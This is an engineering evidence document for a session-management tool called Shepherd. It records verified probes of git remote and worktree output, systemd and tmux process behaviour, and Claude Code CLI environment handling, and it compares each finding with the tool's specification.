- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_git.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_git.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/git.txt`)
```text
$ git -C /root/Shepherd remote get-url origin
error: No such remote 'origin'
[rc=2]
...
$ git -C /tmp/shp-lpg-git.YD7ktR/main remote get-url origin
/tmp/shp-lpg-git.YD7ktR/origin-src
[rc=0]
$ git -C /tmp/shp-lpg-git.YD7ktR/main remote get-url gh-ssh
git@github.com:example-org/example-repo.git
[rc=0]
$ git -C /tmp/shp-lpg-git.YD7ktR/main remote get-url gh-sshurl
ssh://git@github.com/example-org/example-repo.git
[rc=0]
$ git -C /tmp/shp-lpg-git.YD7ktR/main remote get-url gh-https
https://github.com/example-org/example-repo.git
[rc=0]
$ git -C /tmp/shp-lpg-git.YD7ktR/main remote get-url gl-https-noext
https://gitlab.com/example-org/sub-group/example-repo
[rc=0]
$ git -C /tmp/shp-lpg-git.YD7ktR/main remote get-url with-cred
https://oauth2:FAKE_TOKEN_NOT_REAL@gitlab.com/example-org/example-repo.git
[rc=0]
$ git -C /tmp/shp-lpg-git.YD7ktR/main remote get-url rewritten
git@github.com:example-org/example-repo.git
[rc=0]
(config value vs get-url for the insteadOf remote)
$ git -C /tmp/shp-lpg-git.YD7ktR/main config --get remote.rewritten.url
gh:example-org/example-repo.git
[rc=0]
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| stdout | one URL line | sometimes | scp-like `git@host:org/repo.git`; `ssh://git@host/org/repo.git`; `https://host/org/repo(.git)`; nested groups `org/sub-group/repo`; local path | No normalization. The same repo has several spellings |
| rc | int | always | 0; **2** with `error: No such remote '<name>'` | `/root/Shepherd` has no remote |
| userinfo in URL | string | sometimes | `oauth2:FAKE_TOKEN_NOT_REAL@` returned verbatim | Secrets can live in the URL |
| `insteadOf` | config | sometimes | `get-url` returns the rewritten URL; `config --get` returns the raw `gh:` alias | |

**Variants and edge cases:** a bare repo's `get-url origin` works (a local path from `clone --bare`). A repo may have many remotes, and git has no notion of which one is canonical. `/root/src/cc10x-qa` has `origin` = an https GitHub URL (`docs/probes/2026-09-14-schemas/linux-process-git/captures/git.txt` §A).

**Spec alignment:**
- Spec line 633 says `vcs_remote` is "null for non-git", and reality is that it is also absent for a git repo with no remote (rc=2, `/root/Shepherd` itself) and ambiguous with several remotes. The spec does not say which remote, or that `get-url` expands `insteadOf`.
- §13 lines 2052–2053 apply redaction only to `action_log.args` and `work_item.raw`, and reality is that `remote get-url` returns embedded credentials verbatim (`https://oauth2:<token>@…`). Storing that raw in `repo.vcs_remote`, which the UI and the agent's context can read, would leak a token (`docs/probes/2026-09-14-schemas/linux-process-git/captures/git.txt` §B).

### `git worktree list --porcelain` and a linked worktree's `.git` file

- **Produced by:** git 2.43.0
- **Consumed by:** D22 (lazy per-(work item, repo) worktrees, revises D15), §10 worker loop line 1374, §11 `local_destructive` "remove worktree" line 1631, §7 `session.worktree_path` line 665, M1 (discovery/binding of existing worktrees), M5
- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_git.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_git.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/git.txt`)
```text
$ cat /tmp/shp-lpg-git.YD7ktR/main-wt/PROJ-1/.git
gitdir: /tmp/shp-lpg-git.YD7ktR/main/.git/worktrees/PROJ-1
[file type: regular file]
...
$ cat .git/worktrees/PROJ-1/gitdir
/tmp/shp-lpg-git.YD7ktR/main-wt/PROJ-1/.git
$ cat .git/worktrees/PROJ-1/commondir
../..
$ cat .git/worktrees/PROJ-1/HEAD
ref: refs/heads/feat/PROJ-1
$ cat .git/worktrees/locked/locked
probe lock reason

$ git -C /tmp/shp-lpg-git.YD7ktR/main worktree list --porcelain
worktree /tmp/shp-lpg-git.YD7ktR/main
HEAD 03f9ec10bdc1ab0f9b790e3ea489e6eb5ac20f9a
branch refs/heads/main

worktree /tmp/shp-lpg-git.YD7ktR/main-wt/PROJ-1
HEAD 03f9ec10bdc1ab0f9b790e3ea489e6eb5ac20f9a
branch refs/heads/feat/PROJ-1

worktree /tmp/shp-lpg-git.YD7ktR/main-wt/detached
HEAD 03f9ec10bdc1ab0f9b790e3ea489e6eb5ac20f9a
detached

worktree /tmp/shp-lpg-git.YD7ktR/main-wt/gone
HEAD 03f9ec10bdc1ab0f9b790e3ea489e6eb5ac20f9a
branch refs/heads/feat/gone
prunable gitdir file points to non-existent location

worktree /tmp/shp-lpg-git.YD7ktR/main-wt/locked
HEAD 03f9ec10bdc1ab0f9b790e3ea489e6eb5ac20f9a
branch refs/heads/feat/locked
locked probe lock reason

[rc=0]
...
worktree /tmp/shp-lpg-git.YD7ktR/bare.git
bare
...
worktree /tmp/shp-lpg-git.YD7ktR/noremote
HEAD 0000000000000000000000000000000000000000
branch refs/heads/main
...
fatal: cannot remove a locked working tree, lock reason: probe lock reason
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `worktree <abs path>` | line, starts a record | always | main tree first, then linked trees sorted by path | Records are separated by a blank line |
| `HEAD <40-hex>` | line | always except bare | all zeros in a repo with no commits | |
| `branch refs/heads/<name>` | line | sometimes | `refs/heads/main`, `refs/heads/feat/PROJ-1` | Full ref, not the short name |
| `detached` | bare keyword | sometimes | linked `--detach` tree; main tree after `checkout --detach` | Replaces `branch` |
| `bare` | bare keyword | sometimes | bare repo record (no `HEAD`) | |
| `locked [<reason>]` | line | sometimes | `locked probe lock reason` | `worktree remove` refuses it (rc=128) |
| `prunable <reason>` | line | sometimes | `prunable gitdir file points to non-existent location` | Directory deleted by hand; still listed until `worktree prune` |
| `-z` | NUL terminators | option | `worktree …\0HEAD …\0branch …\0\0` | Use `-z` for paths containing newlines |
| worktree `.git` | **regular file** | always for linked worktrees and submodules | `gitdir: <abs path>/.git/worktrees/<name>`; submodule: `gitdir: ../../.git/modules/mods/sub` (relative) | A discovery walk that tests `isdir(".git")` misses both |
| `.git/worktrees/<name>/{gitdir,commondir,HEAD,locked}` | files | always (`locked` sometimes) | back-pointer `…/main-wt/PROJ-1/.git`; `../..`; `ref: refs/heads/feat/PROJ-1` | |

**Variants and edge cases:**
- The same list is printed from inside any linked worktree (`git -C …/main-wt/PROJ-1 worktree list --porcelain` gives an identical record set).
- A worktree of a bare repo: `rev-parse --show-toplevel` = `…/bare-wt/main2`, `--git-common-dir` = `…/bare.git`.
- A detached worktree: `symbolic-ref -q --short HEAD` rc=1 with no output, and `rev-parse --abbrev-ref HEAD` prints `HEAD`.
- The worktree name is the basename (`PROJ-1`). Two worktrees with the same basename get a suffix. Not provoked here.

**Spec alignment:** see the `git rev-parse` schema: the `<repo>-wt/<KEY>/` layout (line 1374) is outside `<repo>`, so longest-prefix binding (D22, lines 126 and 632) cannot bind worktree sessions. The binding must also accept `worktree list --porcelain` paths or `--git-common-dir` as a repo alias. Discovery (line 621, `discover_repos`) must treat a `.git` **file** as a repo marker (`docs/probes/2026-09-14-schemas/linux-process-git/captures/git.txt` §D, §I). Also, Appendix A (lines 2399–2432) uses macOS paths (`/Users/noamsalit/Git/...`) for a platform that D39 (line 143) fixed as Linux.

## Surface: gap-fill (claims no other surface probed)

**Surface:** `gap-fill`. **Source:** `docs/probes/2026-09-14-schemas/gap-fill/SECTION.md`. Paths that do not start with `docs/` or `/` are relative to `docs/probes/2026-09-14-schemas/gap-fill/` (or to the capture folder named in the same caption).

Every capture on this surface was made on 2026-09-14 on Linux 6.8.0-117-generic with `claude --version` = `2.1.270 (Claude Code)` and `tmux 3.4`, unless a block names another binary (the Agent-SDK-bundled CLI `2.1.259`). Each capture folder has a `versions.txt`, or a `meta.json` with `claude_version` for the SDK runs.

**Evidence folder:** `docs/probes/2026-09-14-schemas/gap-fill/`. Re-run any probe from the repo root.

| Capture folder | Script | Covers |
|---|---|---|
| `docs/probes/2026-09-14-schemas/gap-fill/systemd-tmux-20260914T170532Z/` | `bash .../gap-fill/probe_systemd_tmux.sh` | tmux server cgroup under a systemd user unit; stop/restart survival; user-manager PATH; `claude` inside a unit |
| `docs/probes/2026-09-14-schemas/gap-fill/tmux-env-20260914T173859Z/` | `bash .../gap-fill/probe_tmux_env.sh` | which environment a new pane receives |
| `docs/probes/2026-09-14-schemas/gap-fill/tmux-naming-20260914T170739Z/` | `bash .../gap-fill/probe_tmux_naming.sh` | `:` and `.` in session names, `-t` resolution, `$TMUX` inside a pane |
| `docs/probes/2026-09-14-schemas/gap-fill/tmux-attach-keys-20260914T170850Z/` | `bash .../gap-fill/probe_tmux_attach_keys.sh` | second client versus `resize-window`; raw key bytes into a pane (`docs/probes/2026-09-14-schemas/gap-fill/keydump.py`) |
| `docs/probes/2026-09-14-schemas/gap-fill/keys-claude-20260914T180105Z/` | `python3 .../gap-fill/probe_keys_claude.py` | what the Claude Code TUI does with those bytes |
| `docs/probes/2026-09-14-schemas/gap-fill/interrupt-20260914T172251Z/`, `docs/probes/2026-09-14-schemas/gap-fill/interrupt-real-20260914T172811Z/` | `python3 .../gap-fill/probe_interrupt.py [--real]` | Esc / C-c / SIGINT during a turn |
| `docs/probes/2026-09-14-schemas/gap-fill/argv-20260914T173100Z/`, `docs/probes/2026-09-14-schemas/gap-fill/argv-limits-20260914T173342Z/` | `python3 .../gap-fill/probe_argv.py`; `bash .../gap-fill/probe_argv_limits.sh` | brief as argv through `tmux new-session` |
| `docs/probes/2026-09-14-schemas/gap-fill/effort-20260914T171533Z/` | `python3 .../gap-fill/probe_effort.py` | `--effort` values, what reaches the Messages API, hook `effort` |
| `docs/probes/2026-09-14-schemas/gap-fill/sdk-server_info-20260914T171112Z/`, `docs/probes/2026-09-14-schemas/gap-fill/sdk-server_info-syscli-20260914T171115Z/` | `<venv>/bin/python .../gap-fill/sdk_probe.py server_info [--cli PATH]` | `models[]` in the initialize response |
| `docs/probes/2026-09-14-schemas/gap-fill/sdk-approval_timeout-20260914T171126Z/`, `docs/probes/2026-09-14-schemas/gap-fill/sdk-approval_timeout-syscli-20260914T171129Z/` | `<venv>/bin/python .../gap-fill/sdk_probe.py approval_timeout [--cli PATH]` | `can_use_tool` blocking for 630 s |
| `docs/probes/2026-09-14-schemas/gap-fill/transcript-append-20260914T175435Z/` | `python3 .../gap-fill/probe_transcript_append.py` | transcript append-only / whole-line check |
| `docs/probes/2026-09-14-schemas/gap-fill/config-scopes-20260914T173908Z/` | `python3 .../gap-fill/probe_config_scopes.py` | hooks hot-added to a running session; user-scope hooks with `_shepherd_managed`; `claude mcp add -s user`; MCP permission prompt |
| `docs/probes/2026-09-14-schemas/gap-fill/mcp-perm-p-20260914T174121Z/` | `python3 .../gap-fill/probe_mcp_perm_p.py` | permission-rule spellings and sources for an MCP tool in `-p` |
| `docs/probes/2026-09-14-schemas/gap-fill/mcp-add-env-20260914T181206Z/` | `bash .../gap-fill/probe_mcp_add_env.sh` | `claude mcp add -e` argument order |
| `docs/probes/2026-09-14-schemas/gap-fill/pidfd-pty-20260914T175854Z/` | `python3 .../gap-fill/probe_pidfd_pty.py` | pidfd exit observation of a non-child; Claude Code TUI under `pty.fork` |
| `docs/probes/2026-09-14-schemas/gap-fill/lifecycle-end-20260914T175238Z/`, `docs/probes/2026-09-14-schemas/gap-fill/autocompact-real-20260914T174911Z/` | `python3 .../gap-fill/probe_lifecycle_end.py`; `python3 .../gap-fill/probe_autocompact_real.py` | auto compaction, kill during compaction, `SessionEnd.reason` resume/logout |
| `docs/probes/2026-09-14-schemas/gap-fill/elicitation-tui-20260914T174206Z/` | `python3 .../gap-fill/probe_elicitation_tui.py` | MCP elicitation in the TUI |
| `docs/probes/2026-09-14-schemas/gap-fill/cross-version-resume-20260914T175737Z/` | `bash .../gap-fill/probe_cross_version_resume.sh` | resume across 2.1.259 and 2.1.270 |
| `docs/probes/2026-09-14-schemas/gap-fill/websocket-20260914T171610Z/` | `python3 .../gap-fill/probe_websocket.py` | WebSocket libraries; stdlib RFC 6455 handshake |
| `docs/probes/2026-09-14-schemas/gap-fill/binary-context-20260914T174348Z/` | `python3 .../gap-fill/extract_binary_context.py` | binary text around values that could not be provoked |
| `docs/probes/2026-09-14-schemas/gap-fill/cc10x-check-20260914T180206Z/` | `bash .../gap-fill/check_cc10x.sh` | whether cc10x hooks fired in the real-config runs |

(`...` stands for `docs/probes/2026-09-14-schemas`.) Helpers: `docs/probes/2026-09-14-schemas/gap-fill/gaplib.py` (tmux wrapper that always passes `-L shp-gap*`; `MockEnv`; `Tui`), `docs/probes/2026-09-14-schemas/gap-fill/capture_hook.sh` (copied from `tmux-tui/`; appends raw stdin, event name, our UTC timestamp, claude pid, and process ancestry), `docs/probes/2026-09-14-schemas/gap-fill/mock_api2.py` (scriptable local Messages API), `docs/probes/2026-09-14-schemas/gap-fill/mcp_stub.py` (stdio MCP server standing in for `shepherd-mcp`), `docs/probes/2026-09-14-schemas/gap-fill/keydump.py`, `docs/probes/2026-09-14-schemas/gap-fill/redact_account.py`, `docs/probes/2026-09-14-schemas/gap-fill/redact_transcript.py`, `docs/probes/2026-09-14-schemas/gap-fill/verify_examples.py`.

**Probe hygiene.**
- **tmux.** Every call passed `-L shp-gap-*`. Servers were started under `env -i`. Teardown was `kill-server` on those sockets only, or `kill-session -t =<name>` in the naming probe. A final check showed "no server running" on every `shp-gap-*` socket. The user's `shepherd` socket was never addressed.
- **systemd.** Only transient units named `shp-gap-*` were used, and all were stopped afterwards.
- **Isolated backends.** "Mock" runs used `CLAUDE_CONFIG_DIR=<mktemp>/cfg`, a fake `ANTHROPIC_API_KEY` and `ANTHROPIC_BASE_URL=http://127.0.0.1:<port>` served by `docs/probes/2026-09-14-schemas/gap-fill/mock_api2.py`. The CLI binary, its hooks, dialogs and transcripts are real. Only the model replies are scripted.
- **Real-API runs.** These used `claude-haiku-4-5-20251001` with the user's login, in `/tmp/shp-gap-*` directories: `systemd-tmux` (one `-p` turn), `interrupt-real`, `autocompact-real`, `cross-version-resume`, and `sdk-*`.
- **cc10x.** It was disabled in every throwaway settings file. It did not fire: `docs/probes/2026-09-14-schemas/gap-fill/cc10x-check-20260914T180206Z/counts.txt` shows `cc10x_occurrences=0` in every real-config transcript, and each Stop `hookCount` is 1, which is our capture hook.
- **User settings untouched.** `~/.claude/settings.json` has sha256 `375e5322…` both before and after (`docs/probes/2026-09-14-schemas/gap-fill/config-scopes-*/real-user-settings-sha256-{before,after}.txt`). The real-API runs added trust entries to `~/.claude.json`, which the rules allow.
- **Privacy.**
  - No content from the user's own transcripts was read or copied. The only files under `~/.claude/projects` that were read belong to the throwaway sessions above.
  - The Agent SDK initialize response carries `account` (email, organization); `docs/probes/2026-09-14-schemas/gap-fill/redact_account.py` replaced those values with `<redacted>`.
  - A real-config transcript copy was reduced by `docs/probes/2026-09-14-schemas/gap-fill/redact_transcript.py`, because attachments can carry the user's global instructions.
  - The host name that tmux prints in its status line was replaced with `<redacted: host name>`.
  - A mistake during the probe: one exploratory `pkill -f` matched only the probe's own shell. No other process was signalled.

---

### tmux server cgroup under a systemd user unit (`sessiond` stand-in)

- **Produced by:** tmux 3.4 (built with systemd scope support) started from a transient systemd 255 user unit; Linux 6.8 cgroup v2
- **Consumed by:** D14 (spec line 117), §9 LocalRunner table line 1139 "the tmux server is its own process", D39/§15 unit files lines 2209-2219; M3
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_systemd_tmux.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/gap-fill/probe_systemd_tmux.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/gap-fill/systemd-tmux-20260914T170532Z/q1-cgstop.txt`)
```text
KillMode=control-group
...
## pids: unit MainPID=4054469 tmux-server=4054473 pane0(claude)=4054474 pane1(sleep)=4054479
## /proc/<pid>/cgroup before stop
unit-main:   0::/user.slice/user-0.slice/user@0.service/app.slice/shp-gap-sessiond-cgstop.service
tmux-server: 0::/user.slice/user-0.slice/user@0.service/app.slice/shp-gap-sessiond-cgstop.service
pane-claude: 0::/user.slice/user-0.slice/user@0.service/app.slice/tmux-spawn-46d672a6-c748-4b3f-85eb-6c017b5d6d71.scope  comm=claude
...
## after stop (+4s)
...
tmux-server 4054473: dead
pane-claude 4054474: dead
pane-sleep  4054479: dead
## tmux -L shp-gap-sysd-a list-sessions
no server running on /tmp/tmux-0/shp-gap-sysd-a
```
Same launch with `KillMode=process` (`q1-procstop.txt`), and with the server started through `systemd-run --user --scope` from inside the unit (`q1-scopestop.txt`):
```text
KillMode=process
...
tmux-server 4054646: alive(tmux: server)
pane-claude 4054647: alive(claude)
```
```text
tmux-server: 0::/user.slice/user-0.slice/user@0.service/app.slice/shp-gap-tmuxsrv-scopestop.scope
...
tmux-server 4054726: alive(tmux: server)
pane-claude 4054727: alive(claude)
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| tmux server cgroup, first `new-session` run inside the unit | cgroup path | always (4/4 variants) | `.../app.slice/<unit>.service` | the server forks from the unit's client, so it stays in the unit cgroup |
| pane process cgroup | cgroup path | always | `.../app.slice/tmux-spawn-<uuid>.scope` | only pane children move out |
| server + panes after `systemctl --user stop` (control-group) | liveness | always | all `dead`; `no server running` | panes die because their pty master (the server) is gone |
| after `systemctl --user restart` (control-group) | liveness | always | old server and panes `dead`; the new ExecStart creates a **new** server with new pane pids (`pane_pid=4054598`) | the sessions are not preserved (`q1-cgrestart.txt`) |
| after stop with `KillMode=process` | liveness | always | server, claude, sleep `alive` | only MainPID is killed |
| after stop, server started in its own `--scope` | liveness | always | server, claude, sleep `alive` | server cgroup `shp-gap-tmuxsrv-scopestop.scope` |
| `SendSIGHUP` / `KillSignal` defaults | unit property | always | `SendSIGHUP=no`, `KillSignal=15` | |

**Variants and edge cases:**
- When `claude` is not on the unit's PATH, the pane command fails at once. tmux then exits and the unit's second tmux call logs `server exited unexpectedly` (`q1-nopath.txt`). See the next block.
- The `## journal` section of `q1-cgstop.txt` also shows lines from an earlier, discarded run that used the same unit name (a different tmpdir). They are not evidence for this run.
- A `claude` that starts inside a unit gets hook ancestry `capture_hook.sh → sh → claude → sh → systemd` (`docs/probes/2026-09-14-schemas/gap-fill/systemd-tmux-*/hooks.jsonl`).

**Spec alignment:**
- Spec line 1139 says tmux survives a `sessiond` restart or upgrade because "the tmux server is its own process". In reality, a tmux server first started by `sessiond` inside `shepherd-sessiond.service` lives in that unit's cgroup. The default `KillMode=control-group` kills it, and every owned session with it, on `systemctl --user stop` and on `restart` (`q1-cgstop.txt`, `q1-cgrestart.txt`). Survival needs one of two measures, both verified. Start the server in its own scope (`systemd-run --user --scope tmux -L shepherd ...`, `q1-scopestop.txt`), or use `KillMode=process` (`q1-procstop.txt`). The §15 unit sketch (lines 2215-2216) has only `Restart=always`, and `Restart=always` alone brings the unit back with the sessions gone.
- D14 (line 117) says tmux "survives `sessiond` restarts". This holds only with the scope or KillMode measure above (same evidence).

### systemd user-manager environment: PATH, `claude` resolution and auth inside a unit; env handed to panes

- **Produced by:** systemd 255 user manager (`systemctl --user show-environment`), `systemd-run --user`, claude 2.1.270, tmux 3.4
- **Consumed by:** D39 (spec line 143), §15 lines 2209-2219, engine matrix line 547 (`claude -p`), §9 LocalRunner spawn; M3
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_systemd_tmux.sh` (Q2). Re-run: `bash docs/probes/2026-09-14-schemas/gap-fill/probe_systemd_tmux.sh`
- **Status:** verified live 2026-09-14

**Real example** (full captures: `docs/probes/2026-09-14-schemas/gap-fill/systemd-tmux-20260914T170532Z/q2-user-manager-environment.txt`, `q2-unit-claude-resolve.txt`, `q2b-unit-claude-resolve-with-path.txt`, `q2c-unit-auth-turn.txt`)
```text
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/snap/bin
...
command -v claude -> 
claude --version -> /bin/sh: 1: claude: not found
...
claude auth status exit=127
```
```text
PATH=/root/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
command -v claude -> /root/.local/bin/claude
claude --version -> 2.1.270 (Claude Code)
claude auth status exit=0
```
```text
{'type': 'result', 'subtype': 'success', 'is_error': False, 'result': 'PONG', 'num_turns': 1}
```
Pane environment when the unit sets PATH (`q1-cgstop.txt`):
```text
PATH=/root/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TERM=tmux-256color
TMUX_PANE=%0
TMUX=/tmp/tmux-0/shp-gap-sysd-a,4054473,0
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| user manager `PATH` | string | always | `/usr/local/sbin:...:/snap/bin:/snap/bin` | no `~/.local/bin`, which is where the native installer puts `claude` |
| user manager variable names | list | always | `HOME LANG LOGNAME PATH SHELL USER XDG_RUNTIME_DIR XDG_DATA_DIRS DBUS_SESSION_BUS_ADDRESS GSM_SKIP_SSH_AGENT_WORKAROUND SSH_AUTH_SOCK` | values other than PATH/HOME/LANG/SHELL/XDG_RUNTIME_DIR redacted |
| `claude` in a unit without a PATH override | exit | always | `claude: not found`, exit 127 | |
| `claude auth status` in a unit with PATH set | exit | always | `0` | credentials resolve from `$HOME` without a login shell |
| `claude -p` turn from a unit | result | always | `success`, `PONG` | |
| pane env from a unit-started server | env | always | unit env + `TERM=tmux-256color`, `TMUX`, `TMUX_PANE`, plus `INVOCATION_ID`, `JOURNAL_STREAM`, `SYSTEMD_EXEC_PID`, `MEMORY_PRESSURE_*` | systemd variables leak into every claude pane |

**Variants and edge cases:**
- Setting `${TMUX-<unset>}` inside a `systemd-run` command line is unreliable, because systemd does its own `${}` expansion. The `TMUX= CLAUDECODE= TERM=` line in `q2-unit-claude-resolve.txt` is an artifact, not a value, and is not cited.

**Spec alignment:**
- D39 (line 143) and §15 (lines 2209-2219) imply that the daemons can run `claude` as a systemd user service. In reality the user manager's PATH does not contain `/root/.local/bin`, so a unit without `Environment=PATH=...` (or an absolute `claude` path) cannot find `claude`, and every owned spawn fails (`q2-unit-claude-resolve.txt`, `q1-nopath.txt`). With PATH set, auth and a `-p` turn work (`q2b-*`, `q2c-*`). The unit files in §15 need an explicit PATH or an absolute binary path. Neither is written today.

### Pane environment source: tmux server environment versus the calling client (`new-session -e`)

- **Produced by:** tmux 3.4
- **Consumed by:** §9 LocalRunner `Runner.start(spec)` (spec line 424), D11 per-session credential/engine env; M3
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_tmux_env.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/gap-fill/probe_tmux_env.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/gap-fill/tmux-env-20260914T173859Z/env.txt`; capture-pane wraps at 80 columns)
```text
## pane output of shepherd_e1: SHP_PROBE_VAR=from-first-client PATH=/usr/bin:/bin TMUX=/tmp/tmux-0/shp-gap-env,
## pane output of shepherd_e2: SHP_PROBE_VAR=from-first-client PATH=/opt/x:/usr/bin:/bin TMUX=/tmp/tmux-0/shp-g
## pane output of shepherd_e3: SHP_PROBE_VAR=from-dash-e PATH=/usr/bin:/bin TMUX=/tmp/tmux-0/shp-gap-env,406042
## pane output of shepherd_e4: SHP_PROBE_VAR=from-set-environment-g PATH=/usr/bin:/bin TMUX=/tmp/tmux-0/shp-gap
```

| Case | Client env | Pane saw | Notes |
|---|---|---|---|
| e1: first client starts the server | `SHP_PROBE_VAR=from-first-client`, `PATH=/usr/bin:/bin` | both from the client | the server env is copied from this client |
| e2: later client, no `-e` | `SHP_PROBE_VAR=from-second-client`, `PATH=/opt/x:/usr/bin:/bin` | `SHP_PROBE_VAR=from-first-client`, `PATH=/opt/x:...` | ordinary variables come from the **server**; PATH comes from the **client** |
| e3: `new-session -e SHP_PROBE_VAR=from-dash-e -e PATH=/opt/y:...` | `PATH=/usr/bin:/bin` | `SHP_PROBE_VAR=from-dash-e`, `PATH=/usr/bin:/bin` | `-e` works for ordinary variables; `-e PATH=` was overridden by the client's PATH |
| e4: `set-environment -g` then a new session | | `from-set-environment-g` | global env applies to later panes |
| `update-environment` default | | `DISPLAY KRB5CCNAME SSH_ASKPASS SSH_AUTH_SOCK SSH_AGENT_PID SSH_CONNECTION WINDOWID XAUTHORITY` | only these are refreshed from a client |

**Variants and edge cases:**
- This was found by accident. In `docs/probes/2026-09-14-schemas/gap-fill/probe_config_scopes.py`, the first version passed the mock API port only in the client environment. Sessions created after the first one silently talked to the first session's (closed) port and ended in `StopFailure` `server_error` "Connection refused". That run was discarded, and `gaplib.Tui` now passes `-e`.

**Spec alignment:**
- The spec does not say how per-session environment (`CLAUDE_CONFIG_DIR`, credentials, and so on) reaches an owned session. Setting it on the `tmux` client process is silently ignored once the `shepherd` server exists. `new-session -e KEY=VAL` works for ordinary variables, and PATH must be set on the client (`env.txt`). This is a gap to write down, not a contradiction.

### tmux session-name rewriting and `-t` target resolution

- **Produced by:** tmux 3.4
- **Consumed by:** §18 incident, spec lines 2344-2358; §9 naming, line 1135 (`shepherd_<session_id>`); CLAUDE.md rule 4; M3
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_tmux_naming.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/gap-fill/probe_tmux_naming.sh`
- **Status:** verified live 2026-09-14 (throwaway socket; no kill-server)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/gap-fill/tmux-naming-20260914T170739Z/naming.txt`)
```text
$ tmux -L shp-gap-name-a new-session -d -s shepherd:spike1 -x 80 -y 24 sleep 100000
[rc=0]
$ tmux -L shp-gap-name-a new-session -d -s shepherd.dot1 -x 80 -y 24 sleep 100000
[rc=0]
...
$ tmux -L shp-gap-name-a list-sessions -F #{session_name}|#{session_id}|windows=#{session_windows}
shepherd|$0|windows=2
shepherd_dot1|$2|windows=1
shepherd_ok-1|$3|windows=1
shepherd_spike1|$1|windows=1
...
$ tmux -L shp-gap-name-a display-message -p -t shepherd:spike1 resolved: session=#{session_name} window=#{window_name} pane=#{pane_id}
resolved: session=shepherd window=spike1 pane=%1
...
$ tmux -L shp-gap-name-a display-message -p -t shepherd.dot1 resolved(dot, no =): session=#{session_name} window=#{window_name}
resolved(dot, no =): session=shepherd window=sleep
...
$ tmux -L shp-gap-name-a display-message -p -t shepherd_ok resolved(prefix): session=#{session_name}
resolved(prefix): session=shepherd_ok-1
...
$ tmux -L shp-gap-name-a display-message -p -t =no_such_session: nonexistent: session=#{session_name}
nonexistent: session=
[rc=0]
...
$ tmux -L shp-gap-name-a send-keys -t =no_such_session: -l x
can't find session: no_such_session
[rc=1]
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `new-session -s` with `:` | rc / stored name | always | rc 0, stored as `shepherd_spike1` | silent rewrite |
| `new-session -s` with `.` | rc / stored name | always | rc 0, stored as `shepherd_dot1` | also rewritten |
| `-t shepherd:spike1` | resolution | always | session `shepherd`, window `spike1` | also with `=shepherd:spike1` |
| `-t shepherd.dot1` | resolution | always | session `shepherd` (window 0) | `.` is the pane separator |
| `-t shepherd_ok` (no `=`) | resolution | always | `shepherd_ok-1` | unique-prefix match |
| `has-session -t =shepherd_ok` | rc | always | 1, `can't find session: shepherd_ok` | `=` forces exact match |
| `has-session -t shep` (ambiguous prefix) | rc | always | 1 | |
| `display-message -p -t <missing>` | rc / output | always | **rc 0**, formats expand empty | also under `env -i` |
| `send-keys -t <missing>` | rc | always | 1 | |

**Variants and edge cases:**
- A prefix match could make `-t shepherd_ses_1` hit `shepherd_ses_12`. Always use `=name:`.
- Never use `display-message` as an existence check. Use `has-session -t =name`.

**Spec alignment:**
- Aligned with lines 2353-2358 (`:` is rewritten to `_`; `-t shepherd:spike1` resolves to session `shepherd`, window `spike1`). Line 2354 mentions only `:`. `.` is also rewritten, and a `.` in a target means a pane (`naming.txt`), so `session_id` values must exclude both `:` and `.`.

### `$TMUX` inheritance inside a pane

- **Produced by:** tmux 3.4
- **Consumed by:** §18 rule 2, spec lines 2349-2351; CLAUDE.md rule 3; M3
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_tmux_naming.sh` (step 5). Re-run: `bash docs/probes/2026-09-14-schemas/gap-fill/probe_tmux_naming.sh`
- **Status:** verified live 2026-09-14

**Real example** (full capture: `docs/probes/2026-09-14-schemas/gap-fill/tmux-naming-20260914T170739Z/inpane-output.txt`)
```text
inside pane: TMUX=/tmp/tmux-0/shp-gap-name-a,4055044,3
--- bare 'tmux display-message -p #{socket_path}|#{session_name}' (no -L):
/tmp/tmux-0/shp-gap-name-a|shepherd_ok-1
--- bare 'tmux list-sessions -F #{session_name}' (no -L):
shepherd
shepherd_dot1
shepherd_ok-1
shepherd_spike1
--- 'tmux -L shp-gap-name-b list-sessions' (explicit -L):
/tmp/tmux-0/shp-gap-name-b|shepherd_other
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `TMUX` in a pane | `socket_path,server_pid,session_index` | always | `/tmp/tmux-0/shp-gap-name-a,4055044,3` | |
| bare `tmux` command inside a pane | target socket | always | the pane's own socket | |
| `tmux -L other` inside a pane | target socket | always | `other` | `-L` overrides `$TMUX` |

**Spec alignment:** aligned with lines 2349-2351. Only read-only commands were run to show this; no destructive command.

### Second tmux client attaching to a session that `Runner.resize` sized

- **Produced by:** tmux 3.4 (nested client: an outer throwaway tmux pane runs `env -u TMUX tmux -L shp-gap-att-inner attach`)
